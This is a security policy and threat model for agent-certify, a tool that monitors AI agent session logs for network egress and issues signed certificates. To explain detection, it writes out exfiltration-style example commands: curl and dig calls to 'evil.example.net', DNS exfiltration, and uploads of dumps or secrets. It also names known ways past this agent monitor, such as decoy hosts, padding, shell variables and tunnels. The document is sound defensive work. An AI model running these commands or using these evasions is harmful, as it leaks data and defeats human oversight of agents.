# Security Policy

## Reporting a vulnerability

If you discover a security vulnerability in agent-certify,
please report it by emailing david.martin@cognitive-engineering.dev.

Do NOT open a public issue for security vulnerabilities.

We will acknowledge receipt within 48 hours and provide
a fix timeline within 7 days.

## Threat model

agent-certify reads local log files, writes reports and certificates, and
optionally runs as an MCP server.

**It makes no network connections, with one exception an operator has to ask
for by name.** `agent-certify scan`, `learn` and `watch` accept
`--resolve-dns`, which resolves destination *names* to addresses so their
country can be looked up in a local database. It is off by default, it requires
`--geoip-db`, it prints what it is about to do and which resolver it will use
before the first lookup, each name is resolved at most once with a bounded
timeout, and the total number of lookups is capped. Nothing else in the tool
opens a socket: not `certify`, not `verify`, not the MCP server, not any part
of destination or region analysis without that flag. **The MCP server has no
such option at all** — it reads local files and answers region questions from
host names alone (§1, §6). The flag is on the command line, where a person
types it and sees the warning, and nowhere an agent can reach.

The surfaces that matter:

### 1. The MCP server (`agent-certify mcp`)

The server answers tool calls from an AI agent over stdin/stdout. Those
arguments are **untrusted**: an agent may be acting on instructions injected
into content it read. The server therefore:

- never expands environment variables in arguments (only `~`), so a value
  such as `$GITHUB_TOKEN` or `%API_KEY%` stays a literal file name;
- resolves every path argument (symlinks, `..`) and accepts it only inside
  `~/.claude/projects` or its working directory ("Path not allowed" otherwise);
- never returns a resolved path, file contents or exception text; unexpected
  errors go to stderr with a traceback and reach the client as a correlation id;
- does not fall back to other projects' sessions when no session is named;
- bounds each tool call to 30 seconds and every directory scan in depth (5
  levels), file count (1,000) and line size (10 MB).

What the server does return is structural metadata of sessions inside those
roots: tool names (including MCP server and tool names), sub-agent types and
descriptions, call and error counts, project folder names, session ids,
**network destinations** — the host names a session's tool calls pointed at —
and the **sizes** of what those calls sent, per destination (see §6).

The server never resolves a name and never opens a socket. A
`forbidden_region` policy rule is answered from the host's country-code domain
alone — no address database, no DNS — and a destination whose country cannot be
told that way is reported as unknown or ignored, as the rule says. The
`--resolve-dns` option of the command line does not exist here and cannot be
reached through a tool argument.

Prompt text is never extracted. Tool inputs and tool outputs are **read but
not returned**: they are walked for host names only — including, for a shell
tool call, the host names in its command line (§6) — and nothing else of them
leaves the parser: not the argument text, not the command text, not the result
text, not URL credentials, ports or paths. If that metadata is sensitive in your setting, do
not register the server, or start it from a working directory that contains
nothing else.

### 2. Certificates and signing keys

- `verify` requires the issuer's public key, obtained out of band. The key
  embedded in a certificate is informational only and never trusted.
  `--allow-unsigned` bypasses the signature check explicitly, with a warning.
- Certificates expire (90 days by default) and can be bound to a system id
  (`--expect-system-id`). A certificate with **no validity window at all**
  (`cert_format` 1, issued before v0.5) **fails** verification since v0.8.0:
  with no expiry and no revocation list (below), such a certificate is a
  credential that nothing can retire. `--allow-no-expiry` accepts one anyway,
  with a warning — the point is that accepting it is a decision someone makes
  rather than a default inherited from an old release.
- Certificates are loaded with strict type and range validation; NaN and
  Infinity are rejected.
- The private key is a raw Ed25519 seed in hex, **not encrypted**. `keygen`
  creates it atomically with mode 600 and never follows a symlink; `certify`
  warns when it is readable by other users. On Windows the file inherits the
  folder's ACL. Keep keys outside repositories and shared folders, ideally in
  a secrets manager; whoever holds the key can issue certificates that verify.
- **There is no revocation.** This is a property of the trust model, not a
  missing feature flag, and it is worth stating plainly: a certificate that has
  been signed is valid until it expires, and nothing the issuer does afterwards
  can shorten that. There is no list to publish, no endpoint to check, and
  `verify` makes no network call — so a certificate that should not have been
  issued, or whose key has leaked, cannot be called back. What follows from
  that:
  - **To retire a key**: stop distributing its public key, destroy the private
    key, and re-issue with a new one. Every certificate that key signed keeps
    verifying for anyone who still holds the old public key — key rotation
    protects future certificates, not past ones. Distribute public keys the
    same way you would any other trust anchor, so that withdrawing one is a
    change you can actually make.
  - **For a certificate that leaves your organisation**, shorten the window:
    `certify --validity-days 7` (or fewer). The expiry is the only expiry
    mechanism there is, so its length is the whole of your ability to
    de-authorise that file. A 90-day certificate handed to a third party is a
    90-day credential you cannot take back.
  - A revocation file — a signed list of certificate ids an issuer refuses to
    stand behind, read from disk like every other input — is planned for v0.9
    (see `ROADMAP.md`). Until it exists, the two points above are the whole
    procedure.
- **Certificates record egress** (`cert_format` 3, since v0.8.0). A signed
  `egress` section holds the destination patterns the operator had accepted and
  rejected, the forbidden regions in force, and **the destinations the
  certified session actually reached**. `verify` uses it to report a
  destination the certificate does not cover and one in a forbidden region.
  Two consequences:
  - a certificate now contains host names from a real session, so it is no
    longer only structural metadata. Review it before publishing it (§6), the
    same way you would a baseline. **A certificate shared with a third party —
    a customer, an auditor, a supplier — discloses those host names, and
    internal ones can describe infrastructure that the topology never
    revealed.** `certify --omit-observed-destinations` keeps the accepted and
    rejected patterns and the forbidden regions and leaves the observed list
    out entirely; the omission is part of the signed bytes, so it cannot be
    added back or removed afterwards. `verify` then checks the rejected
    patterns and the forbidden regions only, and says in its report that it
    could do no more.
  - formats 1 and 2 keep their original signed bytes — the section is left out
    of the payload for them — so every certificate issued before this still
    verifies, and `verify` says which format it read and that its destinations
    were not checked. `graph_hash` is unchanged: a certificate's identity is
    still its topology.
- **`verify` will not report a pass it cannot stand behind.** When a
  certificate carries no list of observed destinations and the session reached
  some, coverage is not a question anyone can answer: the signature is good,
  the topology matches, and whether those destinations were the certified ones
  is unknown. `verify` exits **3** for that case — distinct from 0 (valid) and
  1 (invalid) — and says so in words. `--accept-unverified-egress` makes it 0,
  explicitly, for an operator who has decided the narrower check is enough.
  The same applies to a certificate with no `egress` section at all
  (`cert_format` 1 or 2).
- Regions in `verify` are decided offline: a country-code domain, or an address
  literal looked up in a local database given with `--geoip-db`. `verify` never
  resolves a name.
- **The dependency floors are the oldest versions CI tests** — `numpy>=1.26.4`
  and `cryptography>=46.0.0` — not a statement about what is safe. The `lowest`
  job installs exactly those two versions under Python 3.10 and runs the whole
  suite against them, so the number in `pyproject.toml` is a tested floor
  rather than a guess. An installation with no constraint on these packages
  takes the most recent release instead, which is what `pip` does by default.
  A deployment that **freezes** a version takes on tracking `cryptography`'s
  security advisories itself: their policy covers "the main branch as well as
  the most recent release"
  ([source](https://cryptography.io/en/latest/security/)), so any frozen older
  series is unpatched by definition, and this package's signatures are only
  worth the library underneath them. The `pip-audit` step in the same `lowest`
  job reports what the floor exposes today; it is informational and does not
  fail the build, so the exposure is visible without the floor becoming a
  moving wall in front of an install.

### 3. Baselines and policies

`.agent-certify/baseline.json` and `policy.json` are **not signed**. Anyone who
can write them (for example, a cloned repository that ships its own) can
relax anomaly detection or empty the policy. Pass `--baseline` / `--policy`
explicitly from a location you control when the verdict matters, and review
these files like code.

### 4. Log parsing

Logs are treated as hostile input: malformed, deeply nested or oversized
records are skipped and counted, never fatal, and the count is shown in
reports, OTel spans and certificates.

### 5. Files written

Reports, baselines, policies, OTel traces and certificates carry identifiers
that came from the machine they were produced on. Named explicitly, because
each one travels further than people expect:

- **the project name.** Derived from the session folder, which is derived from
  a filesystem path: `H--acme-client-audit` or `C--Users-jdoe-work-bigbank` is
  a *path*, so it can carry a user name, a customer name or an unannounced
  project. It appears in the text report, in `scan --format json`, in the OTel
  span attribute `agent_certify.project`, and in the header of an HTML report.
- **the session id**, which identifies one session of one agent on one machine
  and appears in the same four places, plus every certificate.
- **tool and agent names and descriptions**, which can name internal systems.
- **network destinations** (§6), in reports, baselines and certificates.

`scan --hash-project` and `watch --hash-project` replace the project name with
`sha256:<first 12 hex characters>` in **every** output — report, JSON, OTel
span, HTML. The digest is stable, so sessions of one project still group
together across reports. It is **pseudonymisation, not anonymisation**: anyone
holding a list of candidate project names can confirm one by hashing it. It
keeps a name out of a file that gets passed around; it is not a defence against
someone who already knows what to guess. The session id is not hashed — it is
what makes a report traceable to the session it describes.

The `.agent-certify/` folder is created with a `.gitignore` that excludes its
contents; HTML reports are ignored by this repository's `.gitignore`. Do not
publish these files without reviewing them.

### 6. Network destinations (since v0.7.0)

This is the one place where agent-certify looks *inside* a tool call rather
than at its shape, so it is spelled out in full.

**What is read.** For every tool call in a session, the call's arguments are
walked for host names: the host of any full URL, and the value of a field that
names a destination (`url`, `host`, `endpoint`, `base_url`, `webhook_url` … the
full set is `NETWORK_KEYS` in `agent_certify/domains.py`). A tool call's
**result** is walked the same way,
but only when that call's own arguments already carried a destination — so a
file read or a search result full of URLs is not treated as egress. The walk is
bounded (8 levels deep, 2,000 strings, 64 KB per string, 200 hosts per call).

**Which URLs, and what a destination is allowed to look like** (widened in
v0.8.0, after an audit found that each of these reached its destination while
the report said nothing at all — no host, no truncation, no warning):

- **the schemes read are not only the web's.** `http(s)`, `ws(s)` and `ftp(s)`,
  and also `s3`, `gs`, `azure`, `abfs(s)`, `wasb(s)`, `smb`, `ssh`, `sftp`,
  `scp`, `rsync`, `tftp`, `redis(s)`, `postgres(ql)`, `mysql`, `mongodb`,
  `mongodb+srv`, `amqp(s)`, `mqtt`, `ldap(s)` — the list is `URL_SCHEMES`. A
  scheme glued to a preceding word is not a scheme: `logs://x` names nothing.
- **a bucket or a configured remote is a destination without a host name.**
  `s3://logs-eu/key` names a bucket at whichever endpoint the client was
  configured for; `rclone copy f backup:dir` names a remote whose address is in
  rclone's own configuration file. They are recorded as `s3:logs-eu`,
  `gs:logs-eu` and `rclone:backup` — `<kind>:<name>`, a shape no host name can
  take, so no code downstream treats one as resolvable. The operator's accept
  and reject patterns apply as they do to a host (`s3:logs-eu` matches itself,
  `s3:*` matches every bucket of that kind; there is no `*.` wildcard, because
  a bucket name has no subdomains), and the **region is always `unknown`**: a
  bucket name says nothing about where the bucket is, and nothing is resolved
  for it, not even with `--resolve-dns`.
- **an address is canonicalised before anything else.** `2130706433`,
  `0x7f000001`, `0177.0.0.1` and `127.1` are what `inet_aton` and therefore
  every browser and every socket library read as 127.0.0.1; all four are
  normalised to the dotted quad, and that one spelling is what is recorded and
  matched. A number with fewer than four parts whose first octet would be zero
  is not read as an address, which is what keeps a port or a count from
  becoming one.
- **an internationalised name is converted to punycode.** `collector.рф`
  becomes `collector.xn--p1ai` and that is what is kept, so one pattern covers
  both spellings; a pattern typed in Unicode is converted the same way. The
  conversion is the standard library's `idna` codec, it touches no network, and
  it never raises: a name it cannot convert is left alone and then fails the
  shape test like any other non-host. A host shape may now end in a punycode
  tag (`xn--…`) as well as in letters. **An internationalised ccTLD names its
  country** like any other, offline, reported as `ccTLD (IDN)`: the table
  (`IDN_CCTLD_COUNTRY` in `agent_certify/regions.py`) is all 61 delegated IDN
  ccTLDs with the IANA Root Zone Database's own `iso3166_code` for each,
  transcribed from its machine-readable form and pinned by a test to the day it
  was last checked. Without it a `forbidden_region RU` rule did not reach
  `collector.xn--p1ai` — the destination was recorded and reported as new, and
  the rule said nothing, which is the failure mode of a control that looks like
  it is working.

**What is not read at all** (since v0.8.0). Two categories of value are
skipped before anything else happens, because reading them produced findings
about traffic that never existed:

- **file and document content.** The value of a field that carries content —
  `content`, `contents`, `new_string`, `old_string`, `file_text`, `new_source`,
  `text`, `body`, `edits`, `patch`, `diff`, `replacement`; the full set is
  `CONTENT_KEYS` in `agent_certify/domains.py` — is not walked, whatever the
  tool. A session that *writes* `curl evil.example.net` into a test file, a
  README or a code example has contacted nobody. This is the same distinction
  already made for a tool's result, applied to the arguments of a tool that
  writes; the `Bash` call that later runs what was written is read exactly as
  before, since `command` is not a content key.
- **anything that is not shaped like a host.** The host of a URL now passes the
  same shape test as a bare value: at least one dot and a letters-only or
  punycode suffix, an address literal (v4 in any of its spellings, or bracketed
  v6), `localhost`, or a `<kind>:<name>` bucket or remote. Trailing prose
  and markdown punctuation is stripped first. `https://a`, `http://api/x` and a
  URL at the end of a markdown span used to be recorded as the destinations
  `a`, `api` and `` x.example.com` ``.

Measured over eleven held-out real sessions (baselines of two to four sessions, so a worst case), before and after, back to back on the same files: **109 anomalies before, 72 after; 94 critical before, 58 after**. Of the 104 hosts read before, 43 stopped being read, and **not one of them had been contacted** — traced key by key: 16 were not shaped like a host, 19 appeared only in a file-writing argument, 8 were a fragment of a quoted argument. Every genuine destination survived, the outbound-volume spike included. The benchmark injects a clean `Write` call whose contents name a
host (`written_url`) so the content claim stays measured.

The v0.8.0 widening was measured the same way, on the same held-out sessions,
before and after, per check and per severity: **no new anomaly** on any session
that was not itself about testing this feature, and no alert lost except two
words glued to a scheme, which the scheme guard now refuses. On the injection
benchmark the five faults are detected on every trial. The honest reading is
that the new readers found nothing on logs written before they existed, and
that is what was expected: what they close is a gap in what *can* be reported,
not a backlog of missed traffic.

**The command line of a shell tool call is read too** (since the
`shell_domain` blind spot was closed; it is a *new category of input data*, so
it is named here under the review rule below). The value of a field that
carries a command — `command`, `cmd`, `script` and their variants, the full set
is `SHELL_KEYS` — is parsed as a command line: split into segments on `|`,
`||`, `&&`, `;` and `&` **outside quotes** (a line break always separates, and
quoting is judged per line), tokenised with `shlex`, wrappers (`sudo`,
`env VAR=x`, `time`, `nohup`, `command`, `exec`) and leading `VAR=value`
assignments dropped. A separator inside a quoted argument does not start a
command, so `git commit -m "fix; curl api.example.net"` reads as the one
command it is; a line whose quoting does not balance falls back to splitting on
every separator. **Only host names are taken out of it, and only from the
arguments of a known network client** (`curl`, `wget`, `ssh`, `scp`, `nc`,
`git clone` … the full set is `NETWORK_COMMANDS`): nothing is read from the
arguments of any other program, and nothing of the command line itself — not
the program, not the flags, not the data, not file paths, not credentials in a
`-u` argument — is kept, logged, reported or transmitted.

`NETWORK_COMMANDS` was widened in v0.8.0, in five families: the web and remote
shells (`curl`, `wget`, httpie, `nc`, `socat`, `telnet`, `ssh`, `scp`, `sftp`,
`rsync`, `ftp`, `tftp`, `smbclient`, `git`), PowerShell's web cmdlets, object
storage and cloud CLIs (`aws`, `gcloud`, `gsutil`, `az`, `azcopy`, `rclone`,
`mc`, `s3cmd`, `kubectl` — by endpoint option, bucket URL or `remote:path`),
resolvers (`dig`, `nslookup`, `host`, `drill`) and database, cache and TLS
clients (`psql`, `mysql`, `mysqldump`, `redis-cli`, `mongosh`, `mongo`,
`mongodump`, `openssl s_client`). For the last three families the destination
is taken from a named option or a connection URL rather than from the shape of
a positional argument, because a bucket name, a resource name and a database
name all look alike: `aws --version`, `kubectl get pods`, `psql -f file.sql`
and `rclone listremotes` name no destination and produce none.

**For a resolver, the name being queried is the destination.**
`dig secret-data.evil.example.net +short` opens no connection to that host and
sends no payload — and tells whoever operates that zone what the name says. DNS
exfiltration is not a connection, so a reader that looks only for connections
reports nothing about it. `dig @server` and `drill @server` also name the
server asked.

**A command substitution is read, one level deep.** `$(…)` and backticks hold a
command line, and a command line can reach somewhere, so the contents are read
as one — and then removed from the line that held them, since a substitution is
not a token of the line around it. That is what makes both
`X=$(curl host/x)`, where the substitution is the whole command, and
`TOKEN=$(cat /tmp/t) curl api.example.net/v1`, where it stands between the
shell and the program, read correctly. Nothing is expanded or executed: the
text inside is parsed exactly as the text outside is. When the depth limit
stops a nesting whose text holds a URL or the name of a known client, the call
is counted as a truncated scan and the anomaly is raised; a nesting holding
neither — `ssh host 'JOB=$(sbatch …)'` — is not reported, because it was read
far enough to establish that there is nothing in it to miss.

A command **inside** a command is read the same way, one level deep
(`MAX_SHELL_DEPTH = 1`): the value of `bash -c` and the other shell wrappers
(`_SHELL_WRAPPERS`), and the remote command of `ssh host '<command>'`. The
inner program is judged by the same rule, and nothing but host names comes out
of it either.

The command is **parsed, never evaluated and never executed**: no variable is
expanded, no substitution is run, no file is opened, nothing is spawned. A host
built in a shell variable, or at the far end of an `ssh -L` forwarding, is
consequently not read at all — both are measured blind spots
(`shell_var_domain`, `ssh_tunnel_domain`) in the injection benchmark. The same
bounds apply, with each argument examined costing one against the 2,000-string
budget, nesting bounded by the depth limit, and a command line that fails to
tokenise falling back to a whitespace split rather than raising.

**How much is measured** (since v0.8.0). For a call that named a destination,
two **sizes** are computed and nothing else:

- **the outbound size**: the UTF-8 size of the call's arguments, serialised as
  compact JSON with sorted keys — one number, computed the same way for every
  parser so the same call measures the same whatever log it came from;
- **how much of it was a declared payload**: for a shell command line, the size
  of the values of the options that carry a request body
  (`curl -d`/`--data`/`--data-raw`/`--data-binary`/`--data-urlencode`/`-F`/
  `--form`/`-T`, `wget --post-data`/`--body-data`, httpie's `key=value`), when
  the value is literal. The full set is `DATA_OPTIONS` in
  `agent_certify/domains.py`.

The second is a *part of* the first, not an addition to it: a literal body is
already inside the argument text that carried it, so it is counted once and
reported separately. The outbound size is attributed to every destination of
that call. A call that named no destination is not measured at all.

**What the log cannot show, and what is therefore not claimed.** These are
sizes *written in a log*, not bytes observed on a network:

- **a file an upload named is not sized.** `curl -T /var/backups/dump.sql host`
  and `curl -d @dump.sql host` count **zero** payload bytes, because the log
  holds the file's name and never its size. A ten-gigabyte dump and a
  ten-kilobyte one produce the same record. Nothing is read from the file
  system to find out: the tool reads logs. This is a measured blind spot
  (`file_upload_exfil` in the injection benchmark), not an estimate.
- **the bytes actually sent are not known.** Compression, chunking, headers,
  TLS overhead, a retried request, a request that never left the machine: none
  of that is in a log. The number is a comparable signal about one
  destination, not an accounting of the wire, and the anomaly says so in its
  own detail line.
- **a body built at run time is not sized**: `curl -d "$(cat secrets)"` or a
  variable expansion carries no literal value. The command is parsed, never
  evaluated (above), so there is nothing to measure.

**What a report carries alongside the destinations.** A destination is
reported next to the identifiers of §5 — the project name and the session id —
so a report that names where a system went also names *which* system, and
whose. `--hash-project` replaces the project name in every output; the session
id stays. **When `--geoip-db` was used**, `scan`, `watch` and `verify` print
`IP geolocation by DB-IP.com, CC BY 4.0` on stderr: the database is published
under CC BY 4.0, which asks for attribution wherever its data is used, and a
report that places a destination in a country is such a use. Carry that line
with the report if you pass it on.

**What is kept.** Only host names and **numbers**. Host names lowercased, with
URL credentials, port, path and query discarded, and nothing resolved: a name
is never turned into an address. The numbers are byte counts and call counts
per destination, and counts of calls whose scan hit a limit. No argument text,
result text, command text, payload, prompt or file content is kept at any
point — a size is not a sample. The hosts and their numbers live on the graph
(`seen_domains`, `egress_bytes`, `egress_calls`) and on the calling node, so a
report can say which tool reached which host and with how much.

**Where a destination is** (since v0.8.0). A destination's country is decided
from its country-code top-level domain (`api.example.cn` is `CN`, `bbc.co.uk`
is `GB`), or — for an address literal — from a local CSV database the operator
supplies with `--geoip-db`. No database ships with the package and none is
downloaded. Both paths are offline. A `.com` hosted in Shanghai is **unknown**
unless `--resolve-dns` is given, and the answer always says which of the three
it came from, because they are not equally strong: a ccTLD is a registration
rather than a location, and an address database says where a block is
registered, which for a CDN is a cache and not the origin. A region is
evidence, not a finding about data residency, and `forbidden_region` is a
tripwire rather than a proof. No country is forbidden by default: the list is
the organisation's, `suggest-policy` never drafts the rule, and the codes in
this document and the README are examples.

**What is stored on disk.** `agent-certify learn` writes every host it saw into
`known_domains` in `.agent-certify/baseline.json`, alongside the `*.cn`-style
patterns an operator accepted or rejected, and — since v0.8.0 — the mean,
deviation, maximum and session count of the **bytes** each of those hosts
received (`domain_egress_volume`). That file is a list of host names the
sessions contacted and four numbers for each; treat it like the rest of §5 and
review it before publishing it. **Certificates carry destinations too** since
`cert_format` 3 (§2): the `egress` section records the host names the certified
session reached, so a certificate is something to review before publishing, not
only to sign. For one that will be shared outside the organisation, issue it
with `certify --omit-observed-destinations`: the rules are signed, the host
names are not written at all, and `verify` reports the narrower check it then
performs. The safest order is to decide who will hold the certificate *before*
issuing it, since re-issuing means re-signing. Certificates do **not** carry destinations: `graph_hash()` covers
node roles, kinds and links only, which is also why certificates issued before
v0.7.0 still verify.

**What is transmitted.** When a session reaches a host the baseline never saw,
one matching a rejected pattern, or one receiving far more data than usual, the
host name and the byte count appear in the anomaly's `message`, `value` and
`detail` fields. Those fields are returned verbatim to
the MCP client by the `check_anomalies` tool. They also appear in text,
Markdown, JSON and HTML reports, and in the `message` attribute of an
`anomaly.*` OTel span event — which, if you export spans, leaves the machine.
A host name is therefore the one piece of tool-call *content* that can travel
out of this tool.

**When the scan is cut short.** Reading destinations out of an argument object
is bounded (200 hosts per call, 2,000 strings per call, 32 levels of nesting,
10 MB of any one string — the same limit the parsers already apply to a
record). Reaching a bound is counted on the call and on the graph and reported
as a `destination_scan_truncated` anomaly, critical when that call did name a
destination. Before v0.8.0 a host past a bound was dropped in silence, which
made the bound an evasion: 200 decoy hosts in one command, or a block of
padding, hid the next one for free. Padding is no longer a bound at all — a
string is read whole, to the 10 MB limit — and the hosts-per-call bound remains
but is now published.

**What region analysis adds, and what it costs.** Reading a ccTLD is string
handling on data already extracted. A `--geoip-db` lookup reads a local file
the operator chose. `--resolve-dns` is the only new *outbound* behaviour in the
tool's history: it sends the host names a session reached to a DNS resolver,
which means the resolver's operator learns them. That is the trade, it is
printed before the first lookup, and it is why the option is explicit, absent
from the MCP server, and off by default.

**Review rule.** Any feature that reads a new category of input data — a new
field, a new part of a record, anything beyond the structural metadata listed
in §1 — **or that makes a network connection** — requires a review and an
update of this document in the same change.
Network destinations shipped in v0.7.0 without one, and this section is the
correction. Two features have gone through it since, each documented in the
change that added it: reading the command line of shell tool calls, and
measuring the size of what a call sent.

## Supported versions

Security fixes go into the latest minor version.
